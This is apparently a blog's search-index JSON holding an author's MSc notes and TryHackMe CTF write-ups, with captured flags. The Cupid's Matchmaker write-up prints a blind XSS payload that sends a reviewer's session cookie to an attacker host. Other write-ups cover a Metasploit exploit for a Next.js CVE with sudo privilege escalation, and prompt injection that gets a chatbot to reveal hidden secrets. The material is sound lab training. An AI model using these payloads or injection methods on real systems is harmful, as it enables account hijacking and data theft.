{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"CTF articles <p>This is a living notebook of security work in progress.</p> <p>Here you\u2019ll find write-ups from CTF challenges and labs (including Hack The Box, TryHackMe, and Hackviser, where permissable by the content provider), alongside notes from courses, conferences, and the occasional reflective post on security practice and career development. New content will be added gradually as challenges are completed and ideas take shape.</p>"},{"location":"#about-me","title":"About me","text":"<p>I currently work in defensive cyber security, with a strong personal interest in the offensive side of the discipline (I remain convinced my dream job is in penetration testing!). I hold an MSc in Ethical Hacking and Cyber Security, with a background rooted in IT, and enjoy exploring how attack techniques, tooling, and human factors intersect with real-world defence.</p> <p>Outside of security, I spend time running, practising yoga, reading (particularly young adult fantasy and Stephen King), and being outnumbered by my dogs. If you'd like to find out a bit more about me, I also have a personal blog that you can find at Unscripted and In Progress</p>"},{"location":"tags/","title":"Tags","text":""},{"location":"tags/#tag:binary-analysis","title":"binary-analysis","text":"<ul> <li>            Love at First Breach 2026 - Advanced Track - LOVELETTER          </li> </ul>"},{"location":"tags/#tag:crypto","title":"crypto","text":"<ul> <li>            Signed Messages          </li> </ul>"},{"location":"tags/#tag:ctf","title":"ctf","text":"<ul> <li>            Love at First Breach 2026 - Advanced Track - LOVELETTER          </li> </ul>"},{"location":"tags/#tag:defensive","title":"defensive","text":"<ul> <li>            Love at First Breach 2026 - Advanced Track - LOVELETTER          </li> </ul>"},{"location":"tags/#tag:easy","title":"easy","text":"<ul> <li>            Cupid's Matchmaker          </li> <li>            CupidBot          </li> <li>            Hidden Deep Into my Heart          </li> <li>            Love Letter Locker          </li> <li>            Love at First Breach 2026 - Advanced Track - LOVELETTER          </li> <li>            Speed Chatting          </li> <li>            TryHeartMe          </li> <li>            Valenfind          </li> </ul>"},{"location":"tags/#tag:forensics","title":"forensics","text":"<ul> <li>            Love at First Breach 2026 - Advanced Track - LOVELETTER          </li> </ul>"},{"location":"tags/#tag:hackviser","title":"hackviser","text":"<ul> <li>            Hackviser Scenarios and Labs          </li> </ul>"},{"location":"tags/#tag:idor","title":"idor","text":"<ul> <li>            Love Letter Locker          </li> </ul>"},{"location":"tags/#tag:jwt","title":"jwt","text":"<ul> <li>            TryHeartMe          </li> </ul>"},{"location":"tags/#tag:lfi","title":"lfi","text":"<ul> <li>            Valenfind          </li> </ul>"},{"location":"tags/#tag:medium","title":"medium","text":"<ul> <li>            Corp Website          </li> <li>            Signed Messages          </li> </ul>"},{"location":"tags/#tag:metasploit","title":"metasploit","text":"<ul> <li>            Corp Website          </li> </ul>"},{"location":"tags/#tag:offensive","title":"offensive","text":"<ul> <li>            Corp Website          </li> <li>            Cupid's Matchmaker          </li> <li>            CupidBot          </li> <li>            Hidden Deep Into my Heart          </li> <li>            Love Letter Locker          </li> <li>            Signed Messages          </li> <li>            Speed Chatting          </li> <li>            TryHeartMe          </li> <li>            Valenfind          </li> </ul>"},{"location":"tags/#tag:privilege-escalation","title":"privilege-escalation","text":"<ul> <li>            Corp Website          </li> </ul>"},{"location":"tags/#tag:prompt-injection","title":"prompt injection","text":"<ul> <li>            CupidBot          </li> </ul>"},{"location":"tags/#tag:room","title":"room","text":"<ul> <li>            Corp Website          </li> <li>            Cupid's Matchmaker          </li> <li>            CupidBot          </li> <li>            Hidden Deep Into my Heart          </li> <li>            Love Letter Locker          </li> <li>            Signed Messages          </li> <li>            Speed Chatting          </li> <li>            TryHeartMe          </li> <li>            Valenfind          </li> </ul>"},{"location":"tags/#tag:scripting","title":"scripting","text":"<ul> <li>            Love at First Breach 2026 - Advanced Track - LOVELETTER          </li> <li>            Signed Messages          </li> </ul>"},{"location":"tags/#tag:tryhackme","title":"tryhackme","text":"<ul> <li>            Corp Website          </li> <li>            Cupid's Matchmaker          </li> <li>            CupidBot          </li> <li>            Hidden Deep Into my Heart          </li> <li>            Love Letter Locker          </li> <li>            Love at First Breach 2026 - Advanced Track - LOVELETTER          </li> <li>            Signed Messages          </li> <li>            Speed Chatting          </li> <li>            TryHeartMe          </li> <li>            Valenfind          </li> </ul>"},{"location":"tags/#tag:unrestricted-file-upload","title":"unrestricted-file-upload","text":"<ul> <li>            Speed Chatting          </li> </ul>"},{"location":"tags/#tag:vulnerability-exploitation","title":"vulnerability-exploitation","text":"<ul> <li>            Corp Website          </li> </ul>"},{"location":"tags/#tag:web","title":"web","text":"<ul> <li>            Corp Website          </li> <li>            Cupid's Matchmaker          </li> <li>            CupidBot          </li> <li>            Hidden Deep Into my Heart          </li> <li>            Love Letter Locker          </li> <li>            Signed Messages          </li> <li>            Speed Chatting          </li> <li>            TryHeartMe          </li> <li>            Valenfind          </li> </ul>"},{"location":"tags/#tag:xss","title":"xss","text":"<ul> <li>            Cupid's Matchmaker          </li> </ul>"},{"location":"hackthebox/","title":"Hack The Box Machines and Challenges","text":"<p>Coming soon!</p>"},{"location":"hackviser/","title":"Hackviser Scenarios and Labs","text":"<p>It is my understanding that writeups for Hackviser Scenarios are not currently permitted (see Discord rules). As such, no full Scenario writeups will be published here. A list of completed Scenarios is included below, with an associated writeup hiding in the wings in case Hackviser ever change their stance on this.</p>","tags":["hackviser"]},{"location":"hackviser/#scenarios","title":"Scenarios","text":"<ul> <li>Anchor</li> <li>Void</li> <li>HackTrace</li> <li>PasteZone</li> </ul>","tags":["hackviser"]},{"location":"hackviser/#labs","title":"Labs","text":"<p>Coming soon.</p>","tags":["hackviser"]},{"location":"msc/cmp508_portfolio/","title":"CMP508 Asessment Part I Portfolio","text":"<p>The portfolio was itself broken into three component parts:  </p> <ol> <li> <p>The completion of a series of 6 tutorials, submitted via the Discussion forum:</p> <ol> <li>Week 1. Grade achieved: A  </li> <li>Week 2. Grade achieved: A  </li> <li>Week 3 with accompanying e-mail usage policy. Grade achieved: A  </li> <li>Week 4. Grade achieved: A  </li> <li>Week 5. Grade achieved: A  </li> <li>Week 6. Grade achieved: A  </li> </ol> </li> <li> <p>A presentation and accompanying handout on a topic of the student's choice (my chosen topic: \"The skills gap and its effect on information security\"). Grade achieved: A+  </p> </li> <li>A case study report into the information security posture of a fictional company, scenario provided. Grade achieved: A</li> </ol>"},{"location":"msc/grs501_portfolio/","title":"GRS501 Asessment Part I Portfolio","text":"<p>The portfolio was itself broken into three component parts: 1. A group-based peer review task (pass/fail task). Grade achieved: Pass 2. A group development task based on a large-scale proposal (pass/fail task). Grade achieved: Pass 3. A research proposal, intended to be the proposal for the upcoming CMP504 Masters Project.  Grade achieved: A+</p>"},{"location":"msc/msc/","title":"Ethical Hacking and Cybersecurity MSc","text":"<p>I have undertaken an MSc in Ethical Hacking and Cyber Security, administered by Abertay University. It took me two years as I did it as part-time course (whilst also continuing to work full-time). Below is a brief outline of the modules that made up the course, along with the papers I submitted and their resulting grade. Further details of the course can be found on the Abertay University website.</p> <p>I was awarded my MSc in November 2025, when I graduated with distinction and a GPA of 4.33.</p>"},{"location":"msc/msc/#year-1","title":"Year 1","text":""},{"location":"msc/msc/#trimester-1","title":"Trimester 1","text":""},{"location":"msc/msc/#cmp506-computer-security","title":"CMP506 - Computer Security","text":"<p>The module explored issues relating to computer security and ethical hacking, including vulnerabilities and techniques for improving defences, UK computer security legislation, penetration test methodologies, and the report writing process. The assessment consisted of two parts: 1. A 2500 word critical essay on the subject of the Computer Misuse Act and how it pertains to a given case study scenario (25% of the overall mark). Grade achieved: A 2. This part of the assessment consisted of practical work (a penetration test and malware analysis conducted on some provided test resources) with an accompanying white paper documenting the findings from the practical work (75% of the overall mark). Grade achieved: A  </p> <p>Overall module grade achieved: A</p>"},{"location":"msc/msc/#cmp508-information-and-network-security-management","title":"CMP508 - Information and Network Security Management","text":"<p>This module explored why information security matters and how it's reflected in policies like the UK government's \"Keeping the UK Safe in Cyberspace\" strategy. We also learned about threat modelling, risk, security auditing/testing and network management/security. The assessment consisted of two parts: 1. A portfolio (50% of the overall mark). Grade achieved: A 2. A report on VoIP network security practices, using a designed network as a reference (50% of the overall mark). Grade achieved: A</p> <p>Overall module grade achieved: A</p>"},{"location":"msc/msc/#trimester-2","title":"Trimester 2","text":""},{"location":"msc/msc/#cmp509-ethical-hacking","title":"CMP509 - Ethical Hacking","text":"<p>This module gave insight into the techniques ethical hackers use to test the security of binary web applications. We learned how to plan and carry out investigations, understand how these techniques work, and explore the countermeasures used to defend against them. Malware analysis and Python scripting elements were integrated into the content for this module. The assessment consisted of two parts: 1. Conduct a web application penetration test on a supplied environment and produce a document describing the findings and the methodology used (50% of the overall mark). Grade achieved: A+ 2. A scripting project - develop an automated tool (preferably in Python) to perform some form of offensive/defensive security task with accompanying documentation (50% of the overall mark). Grade achieved: A+  </p> <p>Overall module grade achieved: A+</p>"},{"location":"msc/msc/#year-2","title":"Year 2","text":""},{"location":"msc/msc/#trimester-1_1","title":"Trimester 1","text":""},{"location":"msc/msc/#cmp507-digital-forensics","title":"CMP507 - Digital Forensics","text":"<p>This module explored the technology and techniques used to investigate cybercrime. We learned how to plan and carry out a full computer forensic investigation, with a strong focus on collecting digital evidence and piecing together events. This module was fully assessed by coursework - conducting a forensic investigation of a supplied computer image and writing a court report detailing the findings. Grade achieved: A+  </p>"},{"location":"msc/msc/#trimester-2_1","title":"Trimester 2","text":""},{"location":"msc/msc/#cmp510-engineering-resilient-systems","title":"CMP510 - Engineering Resilient Systems","text":"<p>This module explored how both human and technical hacking techniques are used to attack systems \u2014 and how understanding them helps build stronger defences. You\u2019ll learn how to investigate methods of attack, apply countermeasures, and improve the overall resilience of systems by combining social and technical approaches by focussing on three main areas: software development, machine learning, and the human-factor. The assessment for this module consisting of three parts: 1. Software security - produce a report detailing a recommendation for a fictional company on how to improve their security posture in relation to a specific software vulnerability (35% of the overall mark). Grade achieved: A 2. The human-factor - produce a report detailing a recommendation for a fictional company on how to improve their security posture in relation to its authentication design (25% of the overall mark). Grade achieved: A 3. Machine learning - produce a classifier and accompanying report to automate the classification of network traffic on a supplied dataset (40% of the overall mark). Grade achieved: A+  </p> <p>Overall module grade achieved: A </p>"},{"location":"msc/msc/#grs501-research-methods","title":"GRS501 - Research Methods","text":"<p>This module introduces research methods and statistical analysis, combining theory with hands-on practice. We explored key approaches to research, how to apply both quantitative and qualitative techniques, statistical measures, and how to deal with ethics. Assessment for this module consisted of two components: 1. A portfolio (50% of the overall mark). Grade achieved: A+ 2. A statistics exam (50% of the overall mark). Grade achieved: A+</p> <p>Overall module grade achieved: A+ </p>"},{"location":"msc/msc/#trimester-3","title":"Trimester 3","text":""},{"location":"msc/msc/#cmp504-masters-project","title":"CMP504 - Masters Project","text":"<p>Choose a topic and carry out a full research project:  </p> <ul> <li>Plan and experiment.  </li> <li>Build a working solution (the \"artefact\").  </li> <li>Collect and analyse data.  </li> <li>Evaluate and present findings.  </li> </ul> <p>Project title - Evaluating Personalised Phishing Awareness Training: A Mixed Methods Study on Emotional Response, Engagement, and User Preference</p> <p>Grade achieved: A+</p>"},{"location":"tryhackme/","title":"TryHackMe Rooms","text":"<p>Love at First Breach (2026) Event Coined by THM as a \"beginner friendly, live red-teaming CTF designed to help you fall in love with breaking things... safely\", this was a ticketed event with prixes available for completing rooms within a certain time limit, accompanied with a competitive CTF with prizes awarded for first completion. My progress and related walkthroughs are detailed in a dedicated Love at First Breach (2026) page.</p>"},{"location":"tryhackme/love_at_first_breach/","title":"Love at First Breach (2026)","text":"<p>Love at First Breach was a Valentine's-themed CTF event that had two parts:  </p> <ol> <li>A set of 10 offensive rooms of easy or medium difficulty, all focussed on web-based attacks of one sort or another. A \"ticket\" was awarded to users upon completion of each room, with more tickets equalling more entries in to the prize draw (spoiler alert, I didn't win anything!). Due to personal time constraints, I only managed to complete nine of the ten rooms within the time limit (detailed below).  </li> <li>A competitive CTF event. Prizes were awarded to those users that finished the event in the quickest time. I didn't get to it before all the prizes were gone, but I did start to look at it before the end of the event.  </li> </ol> <p>Rooms completed within the time limit </p> <ul> <li>Corp Website </li> <li>Cupidbot </li> <li>Cupid's Matchmaker </li> <li>Hidden Deep Into My Heart </li> <li>Love Letter Locker </li> <li>Speed Chatting </li> <li>TryHeartMe </li> <li>Valendind </li> <li>Signed Messages </li> </ul> <p>CTF room Love at First Breach 2026 - Advanced Track</p> <p>Still to complete I am intending on completing the final room and will add it here once it is complete:  </p> <ul> <li>When Hearts Collide (THM link)  </li> </ul>"},{"location":"tryhackme/love_at_first_breach/corp_website/","title":"Corp Website","text":"<p>Platform: TryHackMe Type: Room Difficulty: Medium Link: Corp Website</p>","tags":["tryhackme","room","medium","offensive","web","vulnerability-exploitation","metasploit","privilege-escalation"]},{"location":"tryhackme/love_at_first_breach/corp_website/#description","title":"Description","text":"<p>\"Valentine's Day is fast approaching, and 'Romance &amp; Co' are gearing up for their busiest season.</p> <p>Behind the scenes, however, things are going wrong. Security alerts suggest that \"Romance &amp; Co\" has already been compromised. Logs are incomplete, developers defensive and Shareholders want answers now!</p> <p>As a security analyst, your mission is to retrace the attacker's, uncover how the attackers exploited the vulnerabilities found on the \"Romance &amp; Co\" web application and determine exactly how the breach occurred.</p> <p>You can find the web application here: http://MACHINE_IP:3000\"</p>","tags":["tryhackme","room","medium","offensive","web","vulnerability-exploitation","metasploit","privilege-escalation"]},{"location":"tryhackme/love_at_first_breach/corp_website/#initial-enumeration","title":"Initial Enumeration","text":"<p>Given the challenge description, I went straight in for website enumeration. I used my go-to <code>ffuf</code> command to enumerate the website: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c</code>. Nothing that I didn't already know about here (having already visited the site in a web browser): </p> <p>There was no <code>robots.txt</code> file. Inspection of the source code for the discovered pages showed that they had been formatted badly - this was easily fixed with an online prettifier tool. Skimming through there didn't appear to be anything immediately obvious, maybe apart from an odd string at the top of the document: </p> <p>I tried to identify the encoding but no joy. At this point, I kept it as something useful for later (spoiler alert, it turned out to be a red herring).</p> <p>As a final initial enumeration step, I ran an <code>nmap</code> service scan against the port to check versioning but the only thing that felt vaguely useful was the confirmation of the framework running on the target: </p>","tags":["tryhackme","room","medium","offensive","web","vulnerability-exploitation","metasploit","privilege-escalation"]},{"location":"tryhackme/love_at_first_breach/corp_website/#foothol","title":"Foothol","text":"<p>With no immediately obvious ways to gain a foothold and no idea of any credentials I could possibly use, I took a look at some recent vulnerabilities for the only thing about the web application I could say for sure - it uses the next.js framework. It  didn't take a lot of research to uncover CVE-2025-55182, otherwise known as React2Shell and really the only reason this jumped out at me is because it was pretty big news in the industry when it broke. As I was digging through some of the articles about it, I also found mention that there was a Metasploit module available for it so I fired up <code>msfconsole</code> and did a search for it. Setting the relevant options as required and running its <code>check</code> module suggested the target was vulnerable: </p> <p>Running the exploit gave me a shell almost instantly: </p>","tags":["tryhackme","room","medium","offensive","web","vulnerability-exploitation","metasploit","privilege-escalation"]},{"location":"tryhackme/love_at_first_breach/corp_website/#post-exploitation-enumeration","title":"Post-exploitation enumeration","text":"<p>Knowing the typical location for a user flag in THM boxes, I checked the contents of the logged-in user's home directory and got the user flag: </p> What is the user flag? <pre><code>THM{R34c7_2_5h311_3xpl017}\n</code></pre>","tags":["tryhackme","room","medium","offensive","web","vulnerability-exploitation","metasploit","privilege-escalation"]},{"location":"tryhackme/love_at_first_breach/corp_website/#privilege-escalation","title":"Privilege escalation","text":"<p>One of the first things I do whenever I am looking at quick wins for privilege escalation is check if the user has any <code>sudo</code> privileges with <code>sudo -l</code> and I was in luck with this one: </p> <p>A quick search of GTFOBins gave me almost the exact piece of code to run with a small tweak (<code>python</code> &gt;&gt; <code>python3</code>). I ran the code and <code>root</code> was achieved: </p> <p>As with the user flag, I know that root flags are often held in the <code>/root</code> directory. A quick check and the root flag was mine: </p> What is the root flag? <pre><code>THM{Pr1v_35c_47_175_f1n357}\n</code></pre> <p>Tools Used <code>nmap</code> <code>msfconsole</code></p> <p>Date completed: 15/02/26 Date published: 17/02/26</p>","tags":["tryhackme","room","medium","offensive","web","vulnerability-exploitation","metasploit","privilege-escalation"]},{"location":"tryhackme/love_at_first_breach/cupidbot/","title":"CupidBot","text":"<p>Platform: TryHackMe Type: Room Difficulty: Easy Link: CupidBot</p>","tags":["tryhackme","room","easy","offensive","web","prompt injection"]},{"location":"tryhackme/love_at_first_breach/cupidbot/#description","title":"Description","text":"<p>This AI bot knows more than just love letters. </p> <p>\"You've found Cupid's AI chatbot that writes Valentine's messages. It contains 3 hidden flags in its system. Your job: exploit prompt injection vulnerabilities to extract them all.\"</p>","tags":["tryhackme","room","easy","offensive","web","prompt injection"]},{"location":"tryhackme/love_at_first_breach/cupidbot/#task-1-get-the-first-flag","title":"Task 1: get the first flag","text":"<p>This challenge uses an \"agent\" that opens in a split screen, so there was no standard enumeration (e.g., <code>nmap</code>, etc) to perform. Given that the simplest thing to do with prompt injection is \"just ask\". I did just that and got lucky: </p> <p>By entering the \"secret\" string I got from asking reveals the first flag: </p> Whats [sic] the prompt injection flag? <pre><code>THM{love_9d4f6a2e8c1b5d7f3a9e6c4b8d2f5a7c}\n</code></pre>","tags":["tryhackme","room","easy","offensive","web","prompt injection"]},{"location":"tryhackme/love_at_first_breach/cupidbot/#task-2-get-the-system-flag","title":"Task 2: get the system flag","text":"<p>I thought I would try my luck with the same approach for the second flag (\"just ask\") and once again, got lucky: </p> What [sic] the system flag? <pre><code>THM{cupid_a7f3e89c4b2d6f1a5e8c9d3b7f4a2e6c}\n</code></pre>","tags":["tryhackme","room","easy","offensive","web","prompt injection"]},{"location":"tryhackme/love_at_first_breach/cupidbot/#task-3-get-the-final-flag","title":"Task 3: get the final flag","text":"<p>If something works, why change it, right? I tried the \"just ask\" principle again here, asking for the value of the \"final flag\", but the prompt just kept retelling me the value for the previous flag (the system flag), behaviour that was repeated even when asking for the value of \"FINAL_FLAG\" (name derived from the naming conventions of the previous two and the challenge question).</p> <p>Sticking within the \"just ask\" principle, I thought I would phrase the question slightly differently and just ask it to give me the value of all the flag variables. This time I got lucky: </p> What's the final flag? <pre><code>THM{arrow_3c8f1d5a9e2b6f4c7d1a8e5b9f3c6d2a}\n</code></pre> <p>Date completed: 14/02/26 Date published: 17/02/26</p>","tags":["tryhackme","room","easy","offensive","web","prompt injection"]},{"location":"tryhackme/love_at_first_breach/cupids_matchmaker/","title":"Cupid's Matchmaker","text":"<p>Platform: TryHackMe Type: Room Difficulty: Easy Link: Cupid's Matchmaker</p>","tags":["tryhackme","room","easy","offensive","web","xss"]},{"location":"tryhackme/love_at_first_breach/cupids_matchmaker/#description","title":"Description","text":"<p>Use your web exploitation skills against this matchmaking service.</p> <p>\"Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! \ud83d\udc98No algorithms. No AI. Just genuine human connection</p> <p>You can access the web app here: http://MACHINE_IP:5000\"</p>","tags":["tryhackme","room","easy","offensive","web","xss"]},{"location":"tryhackme/love_at_first_breach/cupids_matchmaker/#enumeration","title":"Enumeration","text":"<p>Given the challenge description, I went straight in for website enumeration. I used my go-to <code>ffuf</code> command to enumerate the website: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c</code>. Nothing much interesting here - there's a login page uncovered but with no clue of a username, I shelved that for the time being: </p> <p>Inspection of the source code for the only three discovered pages didn't turn up anything useful and there was no <code>robots.txt</code> file. As a final initial enumeration step, I ran an <code>nmap</code> service scan against the port to check versioning but there didn't appear to be anything useful for exploitation here. It did reveal that I was working with a Flask server: </p> <p>Knowing that this was a Flask server, I considered it possible that there was SQLi involved. As a quick and dirty test, I put a <code>'</code> in both of the fields on the login page and got back a flat \"Invalid credentials\" warning, rather than a SQL error. With that in mind, I moved to the only other place that interaction with the site was possible - the \"Survey\" page.  </p> <p>A quick test submission of the form resulted in a message from the application to say that a member of staff would review the form submitted. With that in mind, and having seen that the form contents were not being stored anywhere accessible to me as an unauthenticated user, I decided to test for blind stored XSS vulnerability. There are mounds of resources available that explain XSS much better than I can so I won't do that here. I will however explain why that particular type of XSS makes sense here:  </p> <ul> <li>As mentioned, the application has advised that another user will be reviewing the contents of the form that is submitted. This is where the \"stored\" bit comes from - the attack needs to persist in the form for when the reviewer's browser renders it.  </li> <li>Once the form is submitted, I lose visibility of it entirely. This is the \"blind\" part of the attack, and means I need to have the payload execute a command that does something more than display a message on the reviewer's screen (e.g., like with an <code>&lt;alert&gt;</code> tag) and instead have it pass sensitive information from the reviewer's session to somewhere that I can see it.  </li> </ul> <p>With those two points in mind, I decided to use a payload from HackTricks with the intention of having the reviewer's session cookie sent to an HTTP server I was hosting on my attacking machine: <code>&lt;img src=x onerror=this.src=\"http://&lt;ATTACKING_IP&gt;/?c=\"+document.cookie&gt;</code> </p> <p>After initiating a Python web server on my attacking machine, I entered the payload into each of the boxes on the \"Survey\" form (for speed - if I was being thorough, it would have been beneficial to figure out which field was vulnerable) and got a hit instantly back in my web server, which surprisingly contained the flag: </p> What is the flag? <pre><code>THM{XSS_CuP1d_Str1k3s_Ag41n}\n</code></pre> <p>Date completed: 15/02/26 Date published: 17/02/26</p>","tags":["tryhackme","room","easy","offensive","web","xss"]},{"location":"tryhackme/love_at_first_breach/hidden_deep_into_my_heart/","title":"Hidden Deep Into my Heart","text":"<p>Platform: TryHackMe Type: Room Difficulty: Easy Link: Hidden Deep Into my Heart</p>","tags":["tryhackme","room","easy","offensive","web"]},{"location":"tryhackme/love_at_first_breach/hidden_deep_into_my_heart/#description","title":"Description","text":"<p>Find what's hidden deep inside this website.</p> <p>\"My Dearest Hacker, Cupid's Vault was designed to protect secrets meant to stay hidden forever. Unfortunately, Cupid underestimated how determined attackers can be.</p> <p>Intelligence indicates that Cupid may have unintentionally left vulnerabilities in the system. With the holiday deadline approaching, you've been tasked with uncovering what's hidden inside the vault before it's too late.</p> <p>You can find the web application here: http://MACHINE_IP:5000\"</p>","tags":["tryhackme","room","easy","offensive","web"]},{"location":"tryhackme/love_at_first_breach/hidden_deep_into_my_heart/#initial-enumeration","title":"Initial Enumeration","text":"<p>Given the clue provided, we start with simply by checking to see if there's a <code>robots.txt</code> file with entries, and we're in luck: </p> <p>There's also some interesting looking text at the underneath the Disallow entry. No use for that at this point, but something to bear in mind</p> <p>Navigating to the directory from <code>robots.txt</code>, and to the home page, reveals a static web page with nothing in the source code to help us out. The text on the \"secret\" directory tells us we're on the right track though: </p> <p>I used my go-to <code>ffuf</code> command to enumerate the website: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic</code>. This didn't yield anything for the home page but when I ran it against the newly discovered \"secret\" directory, I got a hit: </p> <p>Navigating to the discovered directory, we're greeted with a sign-in page. Remembering that strange text we saw earlier, and bearing in mind that this is an \"administrator\" page, I tried <code>administrator:cupid_arrow_2026!!!</code>, only to be greeted with an \"Invalid credentials\" message. When I tried with <code>admin</code> as the username on the other hand: </p> What is the flag? <pre><code>THM{l0v3_is_in_th3_r0b0ts_txt}\n</code></pre> <p>Tools Used <code>ffuf</code></p> <p>Date completed: 14/02/26 Date published: 17/02/26</p>","tags":["tryhackme","room","easy","offensive","web"]},{"location":"tryhackme/love_at_first_breach/love_letter_locker/","title":"Love Letter Locker","text":"<p>Platform: TryHackMe Type: Room Difficulty: Easy Link: Love Letter Locker</p>","tags":["tryhackme","room","easy","offensive","web","idor"]},{"location":"tryhackme/love_at_first_breach/love_letter_locker/#description","title":"Description","text":"<p>Use your skills to access other users' letters.</p> <p>\"Welcome to LoverLetterLocker, where you can safely write and store your Valentine's letters. For your eyes only?</p> <p>You can access the web app here: http://MACHINE_IP:5000\"</p>","tags":["tryhackme","room","easy","offensive","web","idor"]},{"location":"tryhackme/love_at_first_breach/love_letter_locker/#enumeration","title":"Enumeration","text":"<p>Given the challenge description, I went straight in for website enumeration. I used my go-to <code>ffuf</code> command to enumerate the website: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c</code>. Nothing that I didn't already know about here (having already visited the site in a web browser): </p> <p>Inspection of the source code for the only three discovered pages didn't turn up anything useful and there was no <code>robots.txt</code> file. As a final initial enumeration step, I ran an <code>nmap</code> service scan against the port to check versioning but there didn't appear to be anything useful for exploitation here either.</p>","tags":["tryhackme","room","easy","offensive","web","idor"]},{"location":"tryhackme/love_at_first_breach/love_letter_locker/#foothold","title":"Foothold","text":"<p>With no clue of any username or password, I decided to test the register function first. Registering a fake account was successful, directing me to a page where letters can be viewed (if there are any for the user) and an option to create a new letter. Helpfully, there's a tip from \"Cupid\" about how each letter is given a number: </p> <p>Creating a new letter shows the number of letters in the archive has increased. Opening the letter created shows that the letter has been allocated the same number as the number of letters in the archive: </p> <p>As the reference is right there in the URL, we can try changing the number in the URL to see if we can access other letters that aren't written for us or by us (classic IDOR). Letter #2 is useless for our purpose, but letter #1 has our flag: </p> What is the flag? <pre><code>THM{1_c4n_r3ad_4ll_l3tters_w1th_th1s_1d0r}\n</code></pre> <p>Date completed: 15/02/26 Date published: 17/02/26</p>","tags":["tryhackme","room","easy","offensive","web","idor"]},{"location":"tryhackme/love_at_first_breach/signed_messages/","title":"Signed Messages","text":"<p>Platform: TryHackMe Type: Room Difficulty: Medium Link: Signed Messages</p>","tags":["tryhackme","room","medium","offensive","web","crypto","scripting"]},{"location":"tryhackme/love_at_first_breach/signed_messages/#description","title":"Description","text":"<p>Their messages are secret, unless you find the key.</p> <p>\"LoveNote built it's reputation on trust. Every message, every action, signed and verified by the system itself. LoveNoe claims that no message can be forged, no identity faked.</p> <p>Yet an internal leak suggests the platform may be trusting something it shouldn't. With Valentine's Day fast approaching, the consequences of a broken trust system could be disastrous.</p> <p>You can find the web application here: http://MACHINE_IP:5000\"</p>","tags":["tryhackme","room","medium","offensive","web","crypto","scripting"]},{"location":"tryhackme/love_at_first_breach/signed_messages/#initial-enumeration","title":"Initial Enumeration","text":"<p>Given the challenge description, I went straight in for website enumeration. I used my go-to <code>ffuf</code> command to enumerate the website: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c</code>. There was a hidden directory in the results that instantly drew my attention: </p> <p>Navigating to the page reveals some very interesting information about how keys for users are generated: </p>","tags":["tryhackme","room","medium","offensive","web","crypto","scripting"]},{"location":"tryhackme/love_at_first_breach/signed_messages/#cryptography-exploitation","title":"Cryptography exploitation","text":"<p>The fact that we have the seed given to us in these debug messages is a pretty big vulnerability that makes forging a private key possible in its own right - it means the key generation process is \"deterministic\". With a deterministic key generation process, anyone with the same seed can recreate the exact same key pair. This means that knowing the seed effectively allows an attacker to regenerate another user\u2019s private key.  As a final piece of the pzzle, we're provided with the construction sequence on this page as well.</p> <p>Now. I am not very good at crypto challenges. I am still getting my head around the maths of the process, so I am far from being the best person to provide a guide on how it all works. If you want to dive deep into it, there are a whole host of resources available to look into it - I found it easiest to find a resource with a basic worked example. Since the vulnerability required reproducing the application\u2019s key generation process programmatically, I used AI assistance to help build a Python script implementing the same deterministic construction logic described in the debug output. I don't intend to share it here, for one main reason - I realised that once I generated a forged key, I didn't actually know what to with it! (Spoiler alert - the script actually needs to do more than just forge the admin key, which is another reason for my not sharing it) Time to go back to enumeration...</p>","tags":["tryhackme","room","medium","offensive","web","crypto","scripting"]},{"location":"tryhackme/love_at_first_breach/signed_messages/#further-enumeration","title":"Further enumeration","text":"<p>Going back to my original <code>ffuf</code> results, and looking at the links available on the website, there were no further directories I wasn't aware of. As I spidered through the site, these were my findings:  </p> <ul> <li>Home - nothing interesting here, just the home page.  </li> <li>Messages - a public message board, with one message from the admin user. Nothing interesting in the content.  </li> <li>Verify - a page providing a way to verify that a message is actually from who it claims to be from. It requires the message, the user (the options for which are provided in a drop-down menu), and the hex digest of the message.  </li> <li>Login - this is a pretty simple looking login page. So simple in fact that it doesn't require a password...  </li> <li>Register - simple registration form.  </li> <li>About - a page listing the standards apparently applied to the messaging service being offered.  </li> </ul> <p>There were three more points of note about the site functionality:  </p> <ul> <li>It was possible to log in as the admin user as the login functionality does not require a user password. That said, there did not appear to be anything of use once logged in.</li> <li>When registering a new user, you are provided with a key pair of your own to save locally.</li> <li>Once logged in (as either the admin or newly-registered user), two more pages become available: Dashboard and Compose. The former displays public, sent, and received messages for the user. The latter allows the user to create a message to send to another user or to the public forum.</li> </ul> <p>So after all that enumeration, it still wasn't overly clear as to what the intended attack path was.</p>","tags":["tryhackme","room","medium","offensive","web","crypto","scripting"]},{"location":"tryhackme/love_at_first_breach/signed_messages/#figuring-it-out","title":"Figuring it out","text":"<p>At this point, there was only one piece of discovered functionality that I hadn't interacted with yet - the Verify function. Looking back at the room description, I wondered whether the challenge was to craft a message and key pair that would be successfully verified as an admin message, and with that I had a way forward! I needed three things:  </p> <ul> <li>A forged private key for the admin user.  </li> <li>A message.  </li> <li>The hex digest of the message.</li> </ul> <p>This is where that earlier spoiler comes in - ideally what I needed was a script that did all of these things. As before I turned to ChatGPT to help me out. The script it output was rather rough, and needed a fair bit of tweaking so I would point others to the excellent one created/tailored by Djalil Ayed, itself generated with AI, which works perfectly: </p> <p>From there all that was needed was to navigate to the Verify page, enter the user (admin), message content (gotten either from the script content or the public message board), and the hex digest output from the script. On clicking the \"Verify Signature\" button underneath the form, a success message was generated: </p> What is the flag? 